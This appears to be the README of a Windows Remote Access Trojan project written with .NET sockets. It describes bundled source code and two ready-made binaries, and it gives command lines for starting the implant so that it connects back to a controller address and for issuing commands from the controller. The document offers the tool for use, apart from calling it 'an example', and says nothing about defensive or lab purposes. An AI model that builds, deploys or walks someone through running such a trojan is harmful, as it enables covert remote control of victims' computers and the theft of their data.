Windows Remote Access Trojan (RAT) using .NET Sockets

A client-server example of controlling a RAT in Windows. Although the core provides support for communication with multiple RATs, the command line interface has limited capabilities distinguishing each one.

Contains the source code and the two binaries packaged using ILMerge.

Instructions:

# 1. Start the server in a command-line acting as the RAT (Binaries\rat.exe)
rat ip=[controller-ip-address] port=[controller-port-default-is-9999]

# 2. Start the client in a command-line acting as the controller (Binaries\controller.exe)

controller ip=[listen-ip-address] port=[listen-port-default-is-9999]
# 3. Issue commands from the controller.exe interface